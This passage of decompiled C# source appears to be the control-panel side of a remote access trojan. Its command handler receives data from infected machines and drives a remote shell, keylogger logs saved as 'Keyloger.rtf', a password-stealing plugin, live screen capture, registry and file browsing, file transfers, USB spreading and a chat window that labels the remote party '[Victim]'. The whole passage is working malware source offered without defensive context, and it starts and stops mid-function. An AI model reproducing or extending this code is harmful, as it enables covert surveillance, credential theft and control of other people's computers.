				c.Send(memoryStream.ToArray());
				c.Ping = 0;
				memoryStream.Dispose();
				result = true;
				return result;
			}
			catch (Exception expr_165)
			{
				ProjectData.SetProjectError(expr_165);
				Exception projectError = expr_165;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			result = false;
			return result;
		}

		public static void SendTo(object O)
		{
			ListView.SelectedListViewItemCollection selectedListViewItemCollection = (ListView.SelectedListViewItemCollection)NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(O), new object[]
			{
				0
			}, null);
			try
			{
				IEnumerator enumerator = null;
				try
				{
					enumerator = selectedListViewItemCollection.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						object[] array = new object[1];
						object[] array2 = new object[1];
						int num = 1;
						array2[0] = num;
						array[0] = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(O), array2, null))));
						object[] array3 = array;
						bool[] array4 = new bool[]
						{
							true
						};
						NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array3, null, null, array4, true);
						bool flag = array4[0];
						if (flag)
						{
							NewLateBinding.LateIndexSetComplex(RuntimeHelpers.GetObjectValue(O), new object[]
							{
								num,
								RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array3[0])))
							}, null, true, false);
						}
						listViewItem.ForeColor = (Color)NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(O), new object[]
						{
							2
						}, null);
					}
				}
				finally
				{
					bool flag = enumerator is IDisposable;
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_162)
			{
				ProjectData.SetProjectError(expr_162);
				Exception projectError = expr_162;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		public static object vno(ListViewItem l)
		{
			object result;
			try
			{
				result = string.Concat(new string[]
				{
					l.Text,
					"/",
					l.SubItems[sokserver.hpc].Text,
					"/",
					l.SubItems[sokserver.huser].Text,
					"/",
					l.SubItems[sokserver.hco].Text,
					"/",
					l.SubItems[sokserver.hip].Text
				});
			}
			catch (Exception expr_B0)
			{
				ProjectData.SetProjectError(expr_B0);
				Exception projectError = expr_B0;
				ProjectData.SetProjectError(projectError);
				result = "?";
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			return result;
		}

		public static void Log(string T)
		{
			sokserver.LG.Add(FN.HM() + T);
		}

		public static void Req(object obj)
		{
			Client client = (Client)NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(obj), new object[]
			{
				0
			}, null);
			byte[] array = (byte[])NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(obj), new object[]
			{
				1
			}, null);
			string[] array2 = Strings.Split(FN.BS(ref array), sokserver.Y, -1, CompareMethod.Binary);
			checked
			{
				try
				{
					string text = array2[0];
					string left = text;
					bool flag = Operators.CompareString(left, "get", false) == 0;
					if (flag)
					{
						client.CN = false;
						client.T.Enabled = false;
						up up = (up)sokserver.Gform(array2[1] + array2[2]);
						flag = (up != null);
						if (flag)
						{
							string text2 = "ok";
							client.Client.Client.Send(FN.SB(ref text2), 0, 2, SocketFlags.None);
							sokserver.SNT += 2;
							int num = 0;
							try
							{
								while (num != up.SZ)
								{
									byte[] array3 = new byte[1025];
									int num2 = up.FS.Read(array3, 0, array3.Length);
									client.Client.Client.Poll(-1, SelectMode.SelectWrite);
									client.Client.Client.Send(array3, 0, num2, SocketFlags.None);
									num += num2;
									sokserver.SNT += num2;
									ProgressBar progressBar = up.ProgressBar1;
									progressBar.Value += num2;
								}
								up.Close();
							}
							catch (Exception expr_192)
							{
								ProjectData.SetProjectError(expr_192);
								Exception projectError = expr_192;
								ProjectData.SetProjectError(projectError);
								up.Text = "Connection lost";
								up.Lv1.ForeColor = Color.Red;
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					else
					{
						flag = (Operators.CompareString(left, "post+", false) == 0);
						if (flag)
						{
							Frm_Dowload frm_Dowload = new Frm_Dowload();
							frm_Dowload.FNNNN = array2[1];
							frm_Dowload.SZ = Conversions.ToInteger(array2[2]);
							frm_Dowload.c = client;
							frm_Dowload.osk = sokserver.W.GetClient(array2[3]);
							frm_Dowload.Name = frm_Dowload.osk.ip() + array2[1];
							frm_Dowload.Show();
						}
						else
						{
							flag = (Operators.CompareString(left, "post", false) == 0);
							if (flag)
							{
								client.CN = false;
								client.T.Enabled = false;
								object arg_30B_0 = RuntimeHelpers.GetObjectValue(obj);
								object[] array4 = new object[2];
								array4[0] = 1;
								object[] arg_306_0 = array4;
								int arg_306_1 = 1;
								string text3 = string.Concat(new string[]
								{
									"post+",
									sokserver.Y,
									array2[1],
									sokserver.Y,
									array2[2],
									sokserver.Y,
									array2[3]
								});
								arg_306_0[arg_306_1] = FN.SB(ref text3);
								NewLateBinding.LateIndexSet(arg_30B_0, array4, null);
								sokserver.F.Invoke(new sokserver._Req(sokserver.Req), new object[]
								{
									RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
								});
								int num3 = 0;
								while (sokserver.Gform(array2[3] + array2[1]) == null)
								{
									num3++;
									flag = (num3 == 1000);
									if (flag)
									{
										return;
									}
									Thread.Sleep(10);
								}
								string text2 = "ok";
								client.Client.Client.Send(FN.SB(ref text2), 0, 2, SocketFlags.None);
								sokserver.SNT += 2;
								byte[] array5 = new byte[1025];
								Frm_Dowload frm_Dowload2 = (Frm_Dowload)sokserver.Gform(array2[3] + array2[1]);
								int num4 = 0;
								try
								{
									while (true)
									{
										flag = (num4 == frm_Dowload2.SZ);
										if (flag)
										{
											break;
										}
										client.Client.Client.Poll(-1, SelectMode.SelectRead);
										client.Client.Client.Poll(-1, SelectMode.SelectWrite);
										flag = (client.Client.Available > 0);
										if (flag)
										{
											array5 = new byte[client.Client.Available + 1 - 1 + 1];
											int num5 = client.Client.Client.Receive(array5, 0, array5.Length, SocketFlags.None);
											frm_Dowload2.FS.Write(array5, 0, num5);
											sokserver.RC += num5;
											num4 += num5;
											ProgressBar progressBar = frm_Dowload2.ProgressBar1;
											progressBar.Value += num5;
											frm_Dowload2.FS.Flush();
										}
										else
										{
											client.Client.GetStream().WriteByte(0);
											client.Client.GetStream().Flush();
											sokserver.SNT++;
										}
										Thread.Sleep(1);
									}
									frm_Dowload2.Button1.Enabled = false;
									frm_Dowload2.FS.Close();
									frm_Dowload2.FS.Dispose();
									flag = File.Exists(frm_Dowload2.folder);
									if (flag)
									{
										File.Delete(frm_Dowload2.folder);
									}
									File.Move(frm_Dowload2.tmp, frm_Dowload2.folder);
									frm_Dowload2.Close();
								}
								catch (Exception expr_555)
								{
									ProjectData.SetProjectError(expr_555);
									Exception projectError2 = expr_555;
									ProjectData.SetProjectError(projectError2);
									frm_Dowload2.Text = "connection lost";
									frm_Dowload2.ForeColor = Color.Red;
									ProjectData.ClearProjectError();
									ProjectData.ClearProjectError();
								}
							}
							else
							{
								flag = (Operators.CompareString(left, "us", false) == 0);
								if (flag)
								{
									client.IsUSB = true;
									client.L.ForeColor = Color.Blue;
									List<Client> list = sokserver.usb;
									List<Client> obj2 = list;
									lock (obj2)
									{
										sokserver.usb.Add(client);
										return;
									}
								}
								flag = (Operators.CompareString(left, "RG", false) == 0);
								if (flag)
								{
									Reg reg = (Reg)sokserver.Gform("reg" + client.ip());
									flag = sokserver.F.InvokeRequired;
									if (flag)
									{
										sokserver.F.Invoke(new sokserver._Req(sokserver.Req), new object[]
										{
											RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
										});
									}
									else
									{
										string left2 = array2[1];
										flag = (Operators.CompareString(left2, "~", false) == 0);
										if (flag)
										{
											reg.RGk.Enabled = true;
											reg.RGLIST.Enabled = true;
											reg.RGk.SelectedNode.Nodes.Clear();
											reg.RGLIST.Items.Clear();
											reg.pr.Value = 0;
											reg.pr.Maximum = array2.Length - 3;
											int num6 = array2.Length - 1;
											for (int i = 3; i <= num6; i++)
											{
												try
												{
													ToolStripProgressBar pr = reg.pr;
													ToolStripProgressBar toolStripProgressBar = pr;
													toolStripProgressBar.Value++;
													flag = (array2[i].Length > 0);
													if (flag)
													{
														bool flag2 = array2[i].Contains("/");
														if (flag2)
														{
															string[] array6 = Strings.Split(array2[i], "/", -1, CompareMethod.Binary);
															ListViewItem listViewItem = reg.RGLIST.Items.Add(array6[0]);
															listViewItem.SubItems.Add(array6[1]);
															try
															{
																listViewItem.SubItems.Add(array6[2]);
															}
															catch (Exception expr_7BC)
															{
																ProjectData.SetProjectError(expr_7BC);
																Exception projectError3 = expr_7BC;
																ProjectData.SetProjectError(projectError3);
																ProjectData.ClearProjectError();
																ProjectData.ClearProjectError();
															}
															flag2 = (Operators.CompareString(array6[1], "String", false) == 0);
															if (flag2)
															{
																listViewItem.ImageIndex = 1;
															}
															else
															{
																listViewItem.ImageIndex = 2;
															}
														}
														else
														{
															reg.RGk.SelectedNode.Nodes.Add(array2[i]);
														}
													}
												}
												catch (Exception expr_82F)
												{
													ProjectData.SetProjectError(expr_82F);
													Exception projectError4 = expr_82F;
													ProjectData.SetProjectError(projectError4);
													ProjectData.ClearProjectError();
													ProjectData.ClearProjectError();
												}
											}
											reg.RGk.SelectedNode.Expand();
											reg.RGk.Select();
											reg.RGk.Focus();
											int num7 = reg.RGLIST.Columns.Count - 1;
											for (int j = 0; j <= num7; j++)
											{
												reg.RGLIST.Columns[j].AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize);
											}
											reg.pr.Value = 0;
										}
									}
								}
								else
								{
									bool flag2 = Operators.CompareString(left, "rss", false) == 0;
									if (flag2)
									{
										flag = sokserver.F.InvokeRequired;
										if (flag)
										{
											sokserver.F.Invoke(new sokserver._Req(sokserver.Req), new object[]
											{
												RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
											});
										}
										else
										{
											flag2 = ((Frm_Shell)sokserver.Gform("sh" + client.ip()) == null);
											if (flag2)
											{
												new Frm_Shell
												{
													Name = "sh" + client.ip(),
													sk = client
												}.Show();
											}
										}
									}
									else
									{
										flag2 = (Operators.CompareString(left, "rs", false) == 0);
										if (flag2)
										{
											Frm_Shell frm_Shell = (Frm_Shell)sokserver.Gform("sh" + client.ip());
											flag2 = (frm_Shell != null);
											if (flag2)
											{
												RichTextBox t = frm_Shell.T1;
												RichTextBox obj3 = t;
												lock (obj3)
												{
													frm_Shell.T1.SelectionStart = frm_Shell.T1.TextLength;
													TextBoxBase arg_A64_0 = frm_Shell.T1;
													string text3 = array2[1].Replace("\r\n", "");
													arg_A64_0.AppendText(FN.DEB(ref text3) + "\r\n");
													frm_Shell.T1.SelectionStart = frm_Shell.T1.TextLength;
													frm_Shell.T1.ScrollToCaret();
												}
											}
										}
										else
										{
											flag2 = (Operators.CompareString(left, "rsc", false) == 0);
											if (flag2)
											{
												Frm_Shell frm_Shell2 = (Frm_Shell)sokserver.Gform("sh" + client.ip());
												flag2 = (frm_Shell2 != null);
												if (flag2)
												{
													frm_Shell2.Close();
												}
											}
											else
											{
												flag2 = (Operators.CompareString(left, "sc~", false) == 0);
												if (flag2)
												{
													client.L = new ListViewItem();
													flag2 = sokserver.F.InvokeRequired;
													if (flag2)
													{
														sokserver.F.Invoke(new sokserver._Req(sokserver.Req), new object[]
														{
															RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
														});
													}
													else
													{
														flag2 = ((sc)sokserver.Gform("sc" + client.ip()) == null);
														if (flag2)
														{
															sc sc = new sc();
															sc.osk = sokserver.W.GetClient(array2[1]);
															sc.sz = new Size(Conversions.ToInteger(array2[2]), Conversions.ToInteger(array2[3]));
															sc.P.Image = new Bitmap(sc.sz.Width, sc.sz.Height);
															sc.sk = client;
															sc.Name = "sc" + client.ip();
															sc.Show();
														}
													}
												}
												else
												{
													flag2 = (Operators.CompareString(left, "ChamaFormDesktop", false) == 0);
													if (flag2)
													{
														flag = sokserver.F.InvokeRequired;
														if (flag)
														{
															sokserver.F.Invoke(new sokserver._Req(sokserver.Req), new object[]
															{
																RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))))))
															});
														}
														else
														{
															flag2 = ((Frm_Cap)sokserver.Gform("YYYSHSNDNN" + client.ip()) == null);
															if (flag2)
															{
																Frm_Cap frm_Cap = new Frm_Cap
																{
																	Name = "YYYSHSNDNN" + client.ip()
																};
																frm_Cap.Text = frm_Cap.Text + " : " + array2[3];
																frm_Cap.F = client;
																frm_Cap.Sz = new Size(Conversions.ToInteger(array2[1]), Conversions.ToInteger(array2[2]));
																frm_Cap.Show();
															}
														}
													}
													else
													{
														flag2 = (Operators.CompareString(left, "Meu@", false) == 0);
														if (flag2)
														{
															Frm_Cap frm_Cap2 = (Frm_Cap)sokserver.Gform("YYYSHSNDNN" + client.ip());
															flag2 = (frm_Cap2 != null);
															if (flag2)
															{
																try
																{
																	flag = (array2[1].Length == 1);
																	if (flag)
																	{
																		bool flag3 = Operators.CompareString(frm_Cap2.btnIniciar.Text, "Parar", false) == 0;
																		if (flag3)
																		{
																			frm_Cap2.F.Send(string.Concat(new string[]
																			{
																				"Meu@",
																				sokserver.Y,
																				Conversions.ToString(frm_Cap2.C1.SelectedIndex),
																				sokserver.Y,
																				frm_Cap2.C2.Text,
																				sokserver.Y,
																				Conversions.ToString(frm_Cap2.C.Value)
																			}));
																		}
																	}
																	else
																	{
																		byte[] bY = (byte[])NewLateBinding.LateIndexGet(sokserver.fx(array, "Meu@" + sokserver.Y), new object[]
																		{
																			1
																		}, null);
																		frm_Cap2.PktToImage(bY);
																	}
																}
																catch (Exception expr_E89)
																{
																	ProjectData.SetProjectError(expr_E89);
																	Exception projectError5 = expr_E89;
																	ProjectData.SetProjectError(projectError5);
																	ProjectData.ClearProjectError();
																	ProjectData.ClearProjectError();
																}
															}
														}
														else
														{
															bool flag3 = Operators.CompareString(left, "@@", false) == 0;
															if (flag3)
															{
																byte[] array7 = (byte[])NewLateBinding.LateIndexGet(sokserver.fx(array, "@@" + sokserver.Y), new object[]
																{
																	1
																}, null);
															}
															else
															{
																flag3 = (Operators.CompareString(left, "upk", false) == 0);
																if (flag3)
																{
																	sc sc2 = (sc)sokserver.Gform("sc" + array2[1]);
																	return;
																}
															}
															flag3 = (Operators.CompareString(text, "scPK", false) == 0);
															if (flag3)
															{
																sc sc3 = (sc)sokserver.Gform("sc" + array2[1]);
																flag3 = (sc3 == null);
																if (flag3)
																{
																	client.CN = false;
																	return;
																}
																flag3 = (client.L == null);
																if (flag3)
																{
																	client.L = new ListViewItem();
																}
																PictureBox p = sc3.P;
																PictureBox obj4 = p;
																lock (obj4)
																{
																	flag3 = (Operators.CompareString(sc3.Button1.Text, "Stop", false) == 0);
																	if (flag3)
																	{
																	}
																	string text4 = Strings.Split(array2[2], ",", -1, CompareMethod.Binary)[0];
																	string text5 = Strings.Split(array2[2], ",", -1, CompareMethod.Binary)[1];
																	Size size = new Size(Conversions.ToInteger(Strings.Split(array2[2], ",", -1, CompareMethod.Binary)[0]), Conversions.ToInteger(Strings.Split(array2[2], ",", -1, CompareMethod.Binary)[1]));
																	Bitmap bitmap = new Bitmap(size.Width, size.Height);
																	Graphics graphics = Graphics.FromImage(bitmap);
																	int num8 = 0;
																	Bitmap bitmap2 = (Bitmap)sc3.P.Image.Clone();
																	while (true)
																	{
																		try
																		{
																			graphics.DrawImage(bitmap2.GetThumbnailImage(size.Width, size.Height, null, IntPtr.Zero), 0, 0);
																		}
																		catch (Exception expr_109F)
																		{
																			ProjectData.SetProjectError(expr_109F);
																			Exception projectError6 = expr_109F;
																			ProjectData.SetProjectError(projectError6);
																			num8++;
																			flag3 = (num8 != 5);
																			if (flag3)
																			{
																				ProjectData.ClearProjectError();
																				ProjectData.ClearProjectError();
																				continue;
																			}
																			ProjectData.ClearProjectError();
																			ProjectData.ClearProjectError();
																		}
																		break;
																	}
																	string[] array8 = Strings.Split(array2[3], ",", -1, CompareMethod.Binary);
																	MemoryStream stream = new MemoryStream(Convert.FromBase64String(array8[2]));
																	Image image = Image.FromStream(stream);
																	while (true)
																	{
																		try
																		{
																			Point point = new Point(Conversions.ToInteger(array8[0]), Conversions.ToInteger(array8[1]));
																			graphics.DrawImage(image, point);
																		}
																		catch (Exception expr_113A)
																		{
																			ProjectData.SetProjectError(expr_113A);
																			Exception projectError7 = expr_113A;
																			ProjectData.SetProjectError(projectError7);
																			flag3 = (sc3 != null);
																			if (flag3)
																			{
																				ProjectData.ClearProjectError();
																				ProjectData.ClearProjectError();
																				continue;
																			}
																			ProjectData.ClearProjectError();
																			ProjectData.ClearProjectError();
																		}
																		break;
																	}
																	graphics.Dispose();
																	flag3 = sc3.CheckBox3.Checked;
																	if (flag3)
																	{
																		try
																		{
																			bitmap.Save(sc3.Folder + DateAndTime.TimeOfDay.TimeOfDay.ToString().Replace("/", "").Replace(":", "-") + Conversions.ToString((int)Math.Round(Math.Round((double)DateAndTime.TimeOfDay.Millisecond / 1000.0))) + ".jpg");
																		}
																		catch (Exception expr_1218)
																		{
																			ProjectData.SetProjectError(expr_1218);
																			Exception projectError8 = expr_1218;
																			ProjectData.SetProjectError(projectError8);
																			ProjectData.ClearProjectError();
																			ProjectData.ClearProjectError();
																		}
																	}
																	sc3.P.Image = bitmap;
																	sc3.Text = sc3.QQ + " ~Packet[" + FN.Siz(unchecked((long)array.Length)) + "]";
																	return;
																}
															}
															flag3 = (Operators.CompareString(text, "CH", false) == 0);
															if (flag3)
															{
																flag2 = (client.L == null);
																if (flag2)
																{
																	client.L = new ListViewItem();
																}
																flag3 = sokserver.F.InvokeRequired;
																if (flag3)
																{
																	sokserver.F.Invoke(new sokserver._Req(sokserver.Req), new object[]
																	{
																		RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
																	});
																}
																else
																{
																	Frm_Chat frm_Chat = (Frm_Chat)sokserver.Gform("ch" + client.ip());
																	string left3 = array2[2];
																	flag3 = (Operators.CompareString(left3, "~", false) == 0);
																	if (flag3)
																	{
																		flag2 = (frm_Chat == null);
																		if (flag2)
																		{
																			new Frm_Chat
																			{
																				Name = "ch" + client.ip(),
																				sk = client,
																				osk = sokserver.W.GetClient(array2[1]),
																				T2 = 
																				{
																					Enabled = false
																				},
																				Button1 = 
																				{
																					Enabled = false
																				}
																			}.Show();
																		}
																	}
																	else
																	{
																		flag3 = (Operators.CompareString(left3, "!", false) == 0);
																		if (flag3)
																		{
																			frm_Chat.T2.Enabled = true;
																			frm_Chat.Button1.Enabled = true;
																			Frm_Chat frm_Chat2 = frm_Chat;
																			Frm_Chat obj5 = frm_Chat2;
																			lock (obj5)
																			{
																				frm_Chat.T1.AppendText("Connected ..\r\n");
																				return;
																			}
																		}
																		flag3 = (Operators.CompareString(left3, "@", false) == 0);
																		if (flag3)
																		{
																			Frm_Chat frm_Chat3 = frm_Chat;
																			Frm_Chat obj6 = frm_Chat3;
																			lock (obj6)
																			{
																				frm_Chat.T1.SelectionStart = frm_Chat.T1.TextLength;
																				frm_Chat.T1.SelectionFont = new Font(frm_Chat.T1.Font, FontStyle.Bold);
																				frm_Chat.T1.AppendText("[Victim] ");
																				frm_Chat.T1.SelectionFont = frm_Chat.T1.Font;
																				frm_Chat.T1.AppendText(FN.DEB(ref array2[3]) + "\r\n");
																				frm_Chat.T1.SelectionStart = frm_Chat.T1.TextLength;
																				frm_Chat.T1.ScrollToCaret();
																			}
																		}
																	}
																}
															}
															else
															{
																flag3 = (Operators.CompareString(text, "kla", false) == 0);
																if (flag3)
																{
																	Frm_KeyLooger frm_KeyLooger = (Frm_KeyLooger)sokserver.Gform("kl" + client.ip());
																	Frm_KeyLooger frm_KeyLooger2 = frm_KeyLooger;
																	Frm_KeyLooger obj7 = frm_KeyLooger2;
																	lock (obj7)
																	{
																		frm_KeyLooger.T1.Clear();
																		string[] array9 = Strings.Split(FN.DEB(ref array2[1]), "\r\n", -1, CompareMethod.Binary);
																		frm_KeyLooger.ProgressBar2.Value = 0;
																		frm_KeyLooger.ProgressBar2.Maximum = array9.Length;
																		string[] array10 = array9;
																		for (int k = 0; k < array10.Length; k++)
																		{
																			string t2 = array10[k];
																			frm_KeyLooger.insert(t2);
																			ProgressBar progressBar = frm_KeyLooger.ProgressBar2;
																			ProgressBar progressBar2 = progressBar;
																			progressBar2.Value++;
																		}
																		frm_KeyLooger.T1.ScrollToCaret();
																		frm_KeyLooger.ProgressBar2.Value = 0;
																		frm_KeyLooger.ReToolStripMenuItem.Enabled = true;
																		flag3 = !Directory.Exists(client.Folder);
																		if (flag3)
																		{
																			Directory.CreateDirectory(client.Folder);
																		}
																		frm_KeyLooger.T1.SaveFile(client.Folder + "Keyloger.rtf");
																		return;
																	}
																}
																flag3 = (Operators.CompareString(text, "kl", false) == 0);
																if (flag3)
																{
																	flag2 = sokserver.F.InvokeRequired;
																	if (flag2)
																	{
																		sokserver.F.Invoke(new sokserver._Req(sokserver.Req), new object[]
																		{
																			RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
																		});
																	}
																	else
																	{
																		flag3 = (sokserver.Gform("kl" + client.ip()) == null);
																		if (flag3)
																		{
																			new Frm_KeyLooger
																			{
																				c = client,
																				Name = "kl" + client.ip(),
																				Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(sokserver.vno(client.L)))
																			}.Show();
																		}
																		Thread thread = new Thread(new ParameterizedThreadStart(sokserver.Req));
																		Thread arg_1769_0 = thread;
																		object[] array4 = new object[2];
																		array4[0] = client;
																		object[] arg_1765_0 = array4;
																		int arg_1765_1 = 1;
																		string text3 = "kla" + sokserver.Y + array2[1];
																		arg_1765_0[arg_1765_1] = FN.SB(ref text3);
																		arg_1769_0.Start(array4);
																	}
																}
																else
																{
																	flag3 = (Operators.CompareString(text, "ret", false) == 0);
																	if (flag3)
																	{
																		flag2 = sokserver.F.InvokeRequired;
																		if (flag2)
																		{
																			sokserver.F.Invoke(new sokserver._Req(sokserver.Req), new object[]
																			{
																				RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
																			});
																		}
																		else
																		{
																			string left4 = array2[1];
																			flag3 = (Operators.CompareString(left4, sokserver.GETPLG("pw.dll", null).Hash, false) == 0);
																			if (flag3)
																			{
																				Frm_Password frm_Password = (Frm_Password)sokserver.Gform("Password");
																				flag3 = (frm_Password == null);
																				if (flag3)
																				{
																					frm_Password = new Frm_Password();
																					frm_Password.Show();
																				}
																				Frm_Password arg_183D_0 = frm_Password;
																				string text3 = FN.DEB(ref array2[2]);
																				arg_183D_0.XD(ref client, ref text3);
																			}
																		}
																	}
																	else
																	{
																		flag3 = (Operators.CompareString(text, "inf", false) == 0);
																		if (flag3)
																		{
																			List<string> list2 = new List<string>();
																			list2.Add(FN.DEB(ref array2[1]));
																			int num9 = array2.Length - 1;
																			for (int l = 2; l <= num9; l++)
																			{
																				list2.Add(array2[l]);
																			}
																			client.snf = list2.ToArray();
																			flag3 = (sokserver.F.CEL == client);
																			if (flag3)
																			{
																				sokserver.F.L2.Items[0].SubItems[1].Text = client.snf[0];
																				sokserver.F.L2.Items[1].SubItems[1].Text = client.snf[1];
																				sokserver.F.L2.Items[2].SubItems[1].Text = "%" + client.snf[2] + "%";
																				sokserver.F.L2.Items[3].SubItems[1].Text = client.snf[3];
																				sokserver.F.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
																			}
																		}
																		else
																		{
																			flag3 = (Operators.CompareString(text, "dw", false) == 0);
																			if (flag3)
																			{
																				Frm_Dowload frm_Dowload3 = (Frm_Dowload)sokserver.Gform(client.ip() + array2[1]);
																				flag3 = (frm_Dowload3 == null);
																				if (flag3)
																				{
																					client.Send("close" + sokserver.Y + array2[1]);
																				}
																				else
																				{
																					byte[] array11 = (byte[])NewLateBinding.LateIndexGet(FN.fx(array, "dw" + sokserver.Y + array2[1] + sokserver.Y), new object[]
																					{
																						1
																					}, null);
																					frm_Dowload3.FS.Write(array11, 0, array11.Length);
																					frm_Dowload3.FS.Flush();
																					ProgressBar progressBar = frm_Dowload3.ProgressBar1;
																					progressBar.Value += array11.Length;
																					flag3 = (frm_Dowload3.FS.Length == unchecked((long)frm_Dowload3.SZ));
																					if (flag3)
																					{
																						frm_Dowload3.FS.Close();
																						client.Send("close" + sokserver.Y + array2[1]);
																						frm_Dowload3.Button1.Text = "Save";
																					}
																					else
																					{
																						client.Send("de" + sokserver.Y + array2[1]);
																					}
																				}
																			}
																			else
																			{
																				flag3 = (Operators.CompareString(text, "up", false) == 0);
																				if (flag3)
																				{
																					up up2 = (up)sokserver.Gform(client.ip() + array2[1]);
																					flag3 = (up2 == null);
																					if (flag3)
																					{
																						client.Send("close" + sokserver.Y + array2[1]);
																					}
																					else
																					{
																						flag3 = (up2.ProgressBar1.Value == up2.ProgressBar1.Maximum);
																						if (flag3)
																						{
																							client.Send("close" + sokserver.Y + array2[1]);
																							up2.FS.Close();
																							up2.FS.Dispose();
																							up2.Close();
																						}
																						else
																						{
																							byte[] array12 = new byte[5121];
																							int num10 = up2.FS.Read(array12, 0, array12.Length);
																							ProgressBar progressBar = up2.ProgressBar1;
																							progressBar.Value += num10;
																							MemoryStream memoryStream = new MemoryStream();
																							string text6 = "wd" + sokserver.Y + array2[1] + sokserver.Y;
																							memoryStream.Write(FN.SB(ref text6), 0, text6.Length);
																							memoryStream.Write(array12, 0, num10);
																							client.Send(memoryStream.ToArray());
																							memoryStream.Dispose();
																						}
																					}
																				}
																				else
																				{
																					flag3 = (Operators.CompareString(text, "FM", false) == 0);
																					if (flag3)
																					{
																						flag2 = (client.L == null);
																						if (flag2)
																						{
																							client.L = new ListViewItem();
																						}
																						Frm_FileManager frm_FileManager = (Frm_FileManager)sokserver.Gform("fm" + client.ip());
																						string left5 = array2[2];
																						flag3 = (Operators.CompareString(left5, "dw", false) == 0);
																						if (flag3)
																						{
																							flag2 = sokserver.F.InvokeRequired;
																							if (flag2)
																							{
																								sokserver.F.Invoke(new sokserver._Req(sokserver.Req), new object[]
																								{
																									RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
																								});
																							}
																							else
																							{
																								Frm_Dowload frm_Dowload4 = new Frm_Dowload();
																								frm_Dowload4.FNNNN = array2[3];
																								frm_Dowload4.SZ = Conversions.ToInteger(array2[4]);
																								frm_Dowload4.c = client;
																								frm_Dowload4.ProgressBar1.Maximum = frm_Dowload4.SZ;
																								frm_Dowload4.Show();
																								client.Send("de" + sokserver.Y + frm_Dowload4.FNNNN);
																							}
																						}
																						else
																						{
																							flag3 = (Operators.CompareString(left5, "~", false) == 0);
																							if (flag3)
																							{
																								flag2 = (frm_FileManager == null);
																								if (flag2)
																								{
																									flag = sokserver.F.InvokeRequired;
																									if (flag)
																									{
																										sokserver.F.Invoke(new sokserver._Req(sokserver.Req), new object[]
																										{
																											RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
																										});
																									}
																									else
																									{
																										new Frm_FileManager
																										{
																											sk = client,
																											osk = sokserver.W.GetClient(array2[1]),
																											Name = "fm" + client.ip()
																										}.Show();
																									}
																								}
																							}
																							else
																							{
																								flag3 = (Operators.CompareString(left5, "!", false) == 0);
																								if (flag3)
																								{
																									frm_FileManager.L1.Items.Clear();
																									int num11 = array2.Length - 1;
																									for (int m = 3; m <= num11; m++)
																									{
																										string[] array13 = Strings.Split(FN.DEB(ref array2[m]), ";", -1, CompareMethod.Binary);
																										DirectoryInfo directoryInfo = new DirectoryInfo(array13[0]);
																										ListViewItem listViewItem2 = frm_FileManager.L1.Items.Add(directoryInfo.Name);
																										listViewItem2.ToolTipText = directoryInfo.FullName;
																										listViewItem2.SubItems.Add(array13[1]);
																										string left6 = array13[1];
																										flag3 = (Operators.CompareString(left6, DriveType.Fixed.ToString(), false) == 0);
																										if (flag3)
																										{
																											listViewItem2.ImageIndex = 1;
																										}
																										else
																										{
																											flag3 = (Operators.CompareString(left6, DriveType.Removable.ToString(), false) == 0);
																											if (flag3)
																											{
																												listViewItem2.ImageIndex = 3;
																											}
																											else
																											{
																												flag3 = (Operators.CompareString(left6, DriveType.CDRom.ToString(), false) == 0);
																												if (flag3)
																												{
																													listViewItem2.ImageIndex = 2;
																												}
																												else
																												{
																													listViewItem2.ImageIndex = 0;
																													listViewItem2.SubItems[1].Text = "DIR";
																												}
																											}
																										}
																									}
																									frm_FileManager.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
																								}
																								else
																								{
																									flag3 = (Operators.CompareString(left5, "@", false) == 0);
																									if (flag3)
																									{
																										ToolStripProgressBar pr2 = frm_FileManager.pr;
																										ToolStripProgressBar obj8 = pr2;
																										lock (obj8)
																										{
																											flag3 = frm_FileManager.Cache.Contains(FN.DEB(ref array2[3]));
																											if (flag3)
																											{
																												frm_FileManager.Cache.Remove(FN.DEB(ref array2[3]));
																											}
																											FMcach fMcach = new FMcach();
